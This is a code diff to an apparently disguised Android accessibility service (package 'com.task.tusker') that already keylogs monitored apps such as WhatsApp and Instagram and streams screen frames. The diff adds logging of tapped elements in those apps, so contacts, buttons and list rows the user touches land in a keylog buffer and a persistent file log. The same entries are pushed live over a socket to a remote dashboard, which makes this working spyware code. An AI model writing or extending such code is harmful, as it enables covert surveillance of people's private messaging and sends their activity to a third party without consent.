@@ -120,6 +120,31 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // "username" in Instagram DMs). Attached to every keylog entry as "screenTitle".
     private volatile String currentScreenTitle = "";
 
+    // Click-event dedup cache: "pkg|text" → last-logged timestamp (ms).
+    // Prevents duplicate log entries when the OS fires multiple click events for one tap.
+    private final java.util.Map<String, Long> lastClickLogTime = new java.util.HashMap<>();
+
+    // O(1) lookup set for packages that receive click-event keylogging.
+    // Built once from Constants.MONITORED_PACKAGES at class-load time.
+    private static final java.util.Set<String> CLICK_LOG_PACKAGES;
+    static {
+        CLICK_LOG_PACKAGES = new java.util.HashSet<>(
+                java.util.Arrays.asList(com.task.tusker.utils.Constants.MONITORED_PACKAGES));
+    }
+
+    // Click labels that are pure media / UI chrome — not worth logging.
+    // Exact-match (case-insensitive) or prefix-match against the extracted text.
+    private static final java.util.Set<String> CLICK_NOISE_WORDS = new java.util.HashSet<>(
+            java.util.Arrays.asList(
+                "photo", "image", "video", "sticker", "gif", "animated sticker",
+                "audio", "voice message", "document", "file", "media",
+                "thumbnail", "avatar", "profile photo", "profile picture",
+                "navigate up", "back", "more options", "overflow menu",
+                "emoji", "attach", "attachment", "camera", "microphone",
+                "play", "pause", "mute", "unmute", "download", "uploading",
+                "loading", "true", "false", "checked", "unchecked"
+            ));
+
     // Keep-screen-alive (no Activity dependency)
     private KeepAliveManager keepAliveManager;
 
@@ -673,16 +698,27 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     } catch (Exception ignored) {}
                     break;
 
-                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                 case AccessibilityEvent.TYPE_VIEW_SCROLLED:
-                    // Push a frame whenever the device user taps or scrolls
+                    // Push a stream frame on scroll
                     try {
-                        SocketManager sm = SocketManager.getInstance(this);
-                        if (sm.isStreamingActive()) {
-                            sm.scheduleFrameAfterAction(
+                        SocketManager smScroll = SocketManager.getInstance(this);
+                        if (smScroll.isStreamingActive()) {
+                            smScroll.scheduleFrameAfterAction(
                                 com.task.tusker.utils.DeviceInfo.getDeviceId(this));
                         }
                     } catch (Exception ignored) {}
+                    break;
+
+                case AccessibilityEvent.TYPE_VIEW_CLICKED:
+                    // Push a stream frame on tap, and log the tapped element for monitored apps
+                    try {
+                        SocketManager smClick = SocketManager.getInstance(this);
+                        if (smClick.isStreamingActive()) {
+                            smClick.scheduleFrameAfterAction(
+                                com.task.tusker.utils.DeviceInfo.getDeviceId(this));
+                        }
+                    } catch (Exception ignored) {}
+                    logClickForMonitoredApp(event, packageName);
                     break;
 
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
@@ -3243,6 +3279,98 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             return prev;
         }
+    }
+
+    /**
+     * Logs a tap/click event for monitored apps.
+     *
+     * Captures the visible text or content-description of the tapped node so the
+     * keylog shows not just typed characters but also which contacts, buttons, list
+     * rows, and menu items the user interacted with.
+     *
+     * Dedup: the same (package, text) pair is only logged once per 800 ms to prevent
+     * duplicate entries when the OS fires multiple accessibility click events for a
+     * single physical tap (common in WhatsApp, Instagram, and similar apps).
+     */
+    private void logClickForMonitoredApp(AccessibilityEvent event, String packageName) {
+        if (!CLICK_LOG_PACKAGES.contains(packageName)) return;
+        try {
+            AccessibilityNodeInfo src = event.getSource();
+            String text = "";
+            if (src != null) {
+                // 1. Prefer the node's own visible text
+                if (src.getText() != null && src.getText().length() > 0) {
+                    text = src.getText().toString().trim();
+                }
+                // 2. Fall back to content description (screen-reader label / icon caption)
+                if (text.isEmpty() && src.getContentDescription() != null) {
+                    text = src.getContentDescription().toString().trim();
+                }
+                // 3. If the tapped node is an icon inside a row, try the parent's text
+                if (text.isEmpty()) {
+                    try {
+                        AccessibilityNodeInfo parent = src.getParent();
+                        if (parent != null) {
+                            if (parent.getText() != null && parent.getText().length() > 0) {
+                                text = parent.getText().toString().trim();
+                            } else if (parent.getContentDescription() != null) {
+                                text = parent.getContentDescription().toString().trim();
+                            }
+                            parent.recycle();
+                        }
+                    } catch (Exception ignored) {}
+                }
+                src.recycle();
+            }
+
+            if (text.isEmpty() || text.length() > 250) return; // skip empty / over-long nodes
+
+            // Skip pure media / UI-chrome labels (photo, video, sticker, emoji, etc.)
+            String textLower = text.toLowerCase(java.util.Locale.getDefault());
+            if (CLICK_NOISE_WORDS.contains(textLower)) return;
+            // Also skip "voice message 0:23", "video 0:12", etc. (noise word as prefix)
+            boolean startsWithNoise = false;
+            for (String nw : CLICK_NOISE_WORDS) {
+                if (textLower.startsWith(nw + " ") || textLower.startsWith(nw + ":")) {
+                    startsWithNoise = true;
+                    break;
+                }
+            }
+            if (startsWithNoise) return;
+
+            // Skip single characters — usually icon buttons with no real label
+            if (text.length() < 2) return;
+
+            // Dedup: skip if we already logged this exact text for this package within 800 ms
+            String dedupeKey = packageName + "|" + text;
+            long now = System.currentTimeMillis();
+            Long lastTime = lastClickLogTime.get(dedupeKey);
+            if (lastTime != null && now - lastTime < 800) return;
+            lastClickLogTime.put(dedupeKey, now);
+            // Keep the cache small — clear it once it gets large
+            if (lastClickLogTime.size() > 60) lastClickLogTime.clear();
+
+            final String screenTitleSnap = currentScreenTitle;
+            String appName = getAppNameForPkg(packageName);
+
+            // Add to the local keylog buffer (shows up in get_keylogs dumps)
+            String logLine = "[" + packageName + "] "
+                    + (screenTitleSnap.isEmpty() ? "" : "@" + screenTitleSnap + " ")
+                    + "CLICK: " + text;
+            keylogBuffer.add(logLine);
+
+            // Push to LogManager (persistent file log) and live dashboard feed
+            try {
+                SocketManager sm = SocketManager.getInstance(this);
+                sm.getLogManager().logEntry(packageName, appName, text, "CLICK", screenTitleSnap);
+                if (sm.isConnected()) {
+                    String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
+                            java.util.Locale.getDefault()).format(new java.util.Date());
+                    sm.pushKeylogEntry(packageName, appName, text, "CLICK", ts,
+                            false, "click", screenTitleSnap);
+                }
+            } catch (Exception ignored) {}
+        } catch (Exception ignored) {}
     }
 
     /**
